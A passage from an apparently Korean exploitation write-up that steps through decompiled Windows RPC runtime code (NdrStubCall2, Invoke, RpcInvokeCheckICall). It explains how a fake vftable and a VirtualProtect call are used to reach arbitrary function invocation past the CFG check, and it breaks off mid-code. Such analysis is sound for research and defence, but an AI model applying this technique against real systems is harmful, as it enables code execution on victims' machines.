&lt;p&gt;&lt;code&gt;pStubMsg-&amp;gt;Buffer&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0;&amp;#xC11C; 4&amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xB9CC;&amp;#xD07C;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &lt;code&gt;pContext-&amp;gt;StartofStack[StackIndex]&lt;/code&gt;&amp;#xC5D0; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! 8&amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xC778;&amp;#xC790; &amp;#xD558;&amp;#xB098;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xB824;&amp;#xBA74; &amp;#xC778;&amp;#xC790; &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; 8&amp;#xC774;&amp;#xACE0; StackIndex&amp;#xAC00; &amp;#xAC01;&amp;#xAC01; 0, 4&amp;#xC778; Param &amp;#xB450; &amp;#xAC1C;&amp;#xAC00; &amp;#xD544;&amp;#xC694;&amp;#xD558;&amp;#xACA0;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC774; &amp;#xB9AC;&amp;#xD134;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xD55C; &amp;#xAC00;&amp;#xC9C0; &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;LABEL_26:
  v25 = pStubMsg1-&amp;gt;RpcMsg;
  v26 = (LRPC_SCALL *)pStubMsg1-&amp;gt;RpcMsg-&amp;gt;Handle;&lt;span class=&#34;hljs-comment&#34;&gt;//VideoDirtListener, first entry of fake vftable&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v26 )
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (pStubMsg1-&amp;gt;pContext-&amp;gt;Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    {
      ...
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      v27 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (__fastcall **)(LRPC_SCALL *, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(*(_QWORD *)v26 + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;i64);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v27 == LRPC_SCALL::CleanupSystemHandles )
        LODWORD(v25) = LRPC_SCALL::CleanupSystemHandles(v26, &lt;span class=&#34;hljs-number&#34;&gt;5u&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        LODWORD(v25) = v27(v26, &lt;span class=&#34;hljs-number&#34;&gt;5u&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (_DWORD)v25 )
        RpcRaiseException(&lt;span class=&#34;hljs-number&#34;&gt;1783&lt;/span&gt;);
    }
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v25;
}&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&lt;code&gt;RpcMsg&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB294; &amp;#xC6D0;&amp;#xB798; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC774;&amp;#xACE0; &lt;code&gt;Handle&lt;/code&gt;&amp;#xC758; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC778; 0&amp;#xC5D0;&amp;#xB294; &amp;#xAC00;&amp;#xC9DC; vftable&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;v26&lt;/code&gt;&amp;#xC740; &amp;#xC774; &amp;#xAC00;&amp;#xC9DC; vftable&amp;#xC758; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC5D4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0; &amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0; 0x100&amp;#xC744; &amp;#xB354;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xAC12;&amp;#xC774; 0&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C;&amp;#xBA74; &amp;#xC774;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xACE0; &amp;#xB610;&amp;#xD55C; &amp;#xBC18;&amp;#xD658; &amp;#xAC12;&amp;#xC774; 0&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xC608;&amp;#xC678;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB0E5; &amp;#xAC00;&amp;#xC9DC; vftable&amp;#xC758; &amp;#xCCAB; &amp;#xC5D4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xB97C; 0&amp;#xC73C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xC8FC;&amp;#xBA74; if &amp;#xBB38;&amp;#xC73C;&amp;#xB85C; &amp;#xC9C4;&amp;#xC785;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544;&amp;#xC11C; &amp;#xBC14;&amp;#xB85C; &amp;#xB9AC;&amp;#xD134;&amp;#xD558;&amp;#xB294;&amp;#xAC70; &amp;#xC544;&amp;#xB2C8;&amp;#xB0D0;&amp;#xACE0;&amp;#xC694;? &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xB610; &amp;#xCC38;&amp;#xC870;&amp;#xB418;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; 0&amp;#xC73C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xC218;&amp;#xAC00; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x3160;&amp;#x3160; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB294; &amp;#xC798;&amp;#xBABB;&amp;#xB41C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xAC70;&amp;#xB098; &amp;#xD558;&amp;#xB294; &amp;#xB4F1;&amp;#xC758; &amp;#xC774;&amp;#xC720;&amp;#xB85C; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xC2E4;&amp;#xD328;&amp;#xD588;&amp;#xC744; &amp;#xB54C; 0&amp;#xC744; &amp;#xBC18;&amp;#xD658;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC608;&amp;#xC678; &amp;#xC5C6;&amp;#xC774; &amp;#xC798; &amp;#xD1B5;&amp;#xACFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xBB34;&amp;#xD2BC; &amp;#xC774;&amp;#xB807;&amp;#xAC8C; &lt;code&gt;RpcMsg-&amp;gt;Buffer&lt;/code&gt;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC778;&amp;#xC790;&amp;#xB4E4;&amp;#xC774; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC758; &lt;code&gt;arg&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC73C;&amp;#xB85C; &amp;#xBAA8;&amp;#xB450; &amp;#xBCF5;&amp;#xC0AC;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xB300;&amp;#xB9DD;&amp;#xC758; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC778;&amp;#xC790;&amp;#xB4E4;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xBC84;&amp;#xD37C;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h3 id=&#34;Invoke&#34;&gt;&lt;a href=&#34;#Invoke&#34; class=&#34;headerlink&#34; title=&#34;Invoke&#34;&gt;&lt;/a&gt;&lt;code&gt;Invoke&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;v21 = MIDL2-&amp;gt;ThunkTable;
&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v21 &amp;amp;&amp;amp; (v58 = (&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (__fastcall *)(_MIDL_STUB_MESSAGE *, &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; STUB_THUNK *, __int64))v21[ProcNum2]) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64 )
{
  v58(&amp;amp;pStubMsg, v21, ProcNum2);
}
&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
{
  v105 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  v22 = (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; SERVER_ROUTINE *)Msg-&amp;gt;ManagerEpv;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v22 )
    v22 = DispatchTable;
  argc = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)NdrProcContext.StackSize &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (_DWORD)argc &amp;amp;&amp;amp; (*(_BYTE *)(NdrProcContext.&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; (v20 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    LODWORD(argc) = argc - &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v7 )
    v24 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)(v7 + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;);
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    v24 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  v25 = Invoke((__int64 (__fastcall *)(__int64, __int64, __int64, __int64))v22[ProcNum2], args, v24, argc);
  v105 = v25;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*(_BYTE *)(NdrProcContext.&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (NdrProcContext.Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
      *(_QWORD *)&amp;amp;args[&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; * (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)argc] = v25;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pThis )
      (*((&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (__fastcall **)(PRPC_MESSAGE, _QWORD, _QWORD))pNdrOleExtensionsTable + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;))(
        Msg,
        &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64,
        (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v25);
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt;&amp;#xC758; &lt;code&gt;ThunkTable&lt;/code&gt;&amp;#xC774; NULL&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;StubMsg&lt;/code&gt;, &lt;code&gt;ThunkTable&lt;/code&gt;, &lt;code&gt;ProcNum&lt;/code&gt;&amp;#xAC00; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;ThunkTable&lt;/code&gt;&amp;#xC740; NULL&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC57C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &lt;code&gt;RpcMsg&lt;/code&gt;&amp;#xC758; &lt;code&gt;ManagerEpv&lt;/code&gt;&amp;#xB3C4; NULL&amp;#xC774;&amp;#xBA74; &lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt;&amp;#xC758; &lt;code&gt;DispatchTable&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;code&gt;Invoke&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;v22[ProcNum]&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xC778;&amp;#xC790;&amp;#xB4E4;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xBC84;&amp;#xD37C;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;, &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xACE0; &amp;#xC788;&amp;#xB124;&amp;#xC694;! &lt;code&gt;Invoke&lt;/code&gt; &amp;#xB0B4;&amp;#xBD80;&amp;#xC5D0;&amp;#xC120; &amp;#xC5B4;&amp;#xB5A4; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C8;&amp;#xAE4C;&amp;#xC694;?&amp;#x2026;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__int64 __fastcall &lt;span class=&#34;hljs-title&#34;&gt;Invoke&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(__int64 (__fastcall *a1)(__int64, __int64, __int64, __int64), &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *args, __int64 a3, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; argc)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *v4; &lt;span class=&#34;hljs-comment&#34;&gt;// rsp&lt;/span&gt;
  __int64 vars0[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]; &lt;span class=&#34;hljs-comment&#34;&gt;// [rsp+0h] [rbp+0h] BYREF&lt;/span&gt;

  v4 = alloca(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; * ((argc + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFE&lt;/span&gt;));
  qmemcpy(vars0, args, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;i64 * argc);
  RpcInvokeCheckICall(a1);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; a1(vars0[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;], vars0[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;], vars0[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], vars0[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;]);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC5D0; &amp;#xC9E7;&amp;#xC740; &amp;#xBD84;&amp;#xB7C9;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xB2C8; &amp;#xAE30;&amp;#xBD84;&amp;#xC774; &amp;#xB9E4;&amp;#xC6B0; &amp;#xC88B;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!! &amp;#xC778;&amp;#xC790; &amp;#xC804;&amp;#xB2EC;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xB9CC;&amp;#xD07C;&amp;#xC758; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &lt;code&gt;alloca&lt;/code&gt;&amp;#xB85C; &amp;#xCD94;&amp;#xAC00;&amp;#xB85C; &amp;#xD655;&amp;#xC7A5;&amp;#xD55C; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;qmemcpy&lt;/code&gt;&amp;#xB85C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;RpcInvokeCheckICall&lt;/code&gt;&amp;#xB85C; CFG &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xC218;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xD1B5;&amp;#xACFC;&amp;#xD558;&amp;#xBA74; &lt;del&gt;&amp;#xB4DC;&amp;#xB514;&amp;#xC5B4;&lt;/del&gt; &amp;#xC694;&amp;#xCCAD;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Exit&#34;&gt;&lt;a href=&#34;#Exit&#34; class=&#34;headerlink&#34; title=&#34;Exit&#34;&gt;&lt;/a&gt;Exit&lt;/h3&gt;&lt;p&gt;&amp;#xC694;&amp;#xCCAD;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB410;&amp;#xB2E4;&amp;#xACE0; &amp;#xB05D;&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xC8E0;! &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xBAA9;&amp;#xD45C;&amp;#xB294; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xB97C; &lt;del&gt;&amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xB9DE;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0;&lt;/del&gt; &amp;#xC608;&amp;#xC678; &amp;#xC5C6;&amp;#xC774; &amp;#xB9AC;&amp;#xD134;&amp;#xC2DC;&amp;#xCF1C;&amp;#xC918;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xAC00; &amp;#xB9AC;&amp;#xD134;&amp;#xD55C; &amp;#xD6C4; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !pChannel )
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg.IsClient )
    {
      pStubMsg.SavedHandle = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
      pStubMsg.RpcMsg-&amp;gt;Handle = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
    }
    pStubMsg.RpcMsg-&amp;gt;BufferLength = (v26 + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFC&lt;/span&gt;;
    RpcMsg1 = pStubMsg.RpcMsg;
    v98 = pStubMsg.RpcMsg;
    v122 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
    v28 = (BINDING_HANDLE *)pStubMsg.RpcMsg-&amp;gt;Handle;&lt;span class=&#34;hljs-comment&#34;&gt;//v28 == fake vftable&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg.RpcMsg-&amp;gt;Handle
      &amp;amp;&amp;amp; *((_DWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0x89ABCDEF&lt;/span&gt;
      &amp;amp;&amp;amp; (v29 = *((_DWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;), (v29 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x33307C&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) )
    {
      v116 = pStubMsg.RpcMsg-&amp;gt;Handle;
      v30 = v29 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x202048&lt;/span&gt;;
      v96 = v30;
      v101 = pStubMsg.RpcMsg;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v30 &amp;amp;&amp;amp; (pStubMsg.RpcMsg-&amp;gt;RpcInterfaceInformation-&amp;gt;Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x2000000&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
      {
        v34 = (*(__int64 (__fastcall **)(BINDING_HANDLE *, PRPC_MESSAGE, _QWORD))(*(_QWORD *)v28 + &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;i64))(
                v28,
                pStubMsg.RpcMsg,
                &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);
        &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_56;
      }
      v31 = (__int64)NtCurrentTeb()-&amp;gt;ReservedForNtRpc;
      v115 = v31;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v31 )
      {
        v32 = (struct THREAD *)(v31 ^ &lt;span class=&#34;hljs-number&#34;&gt;0xABABABABDEDEDEDE&lt;/span&gt;ui64);
        v115 = (__int64)v32;
        v123 = NtCurrentTeb();
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (HANDLE)*((_QWORD *)v32 + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != v123-&amp;gt;ClientId.UniqueThread )
          __fastfail(&lt;span class=&#34;hljs-number&#34;&gt;0x1E&lt;/span&gt;u);
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v32 )
          &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_217;
      }
      v32 = ThreadSelfHelper();
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v32 )
      {
LABEL_217:
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *((_QWORD *)v32 + &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;) )
        {
          FreeEEInfoChain();
          *((_QWORD *)v32 + &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;) = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
        }
        RpcMsg1-&amp;gt;ProcNum &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFF7FFF&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v30 )                             &lt;span class=&#34;hljs-comment&#34;&gt;// !v30 =&amp;gt; 0&lt;/span&gt;
        {
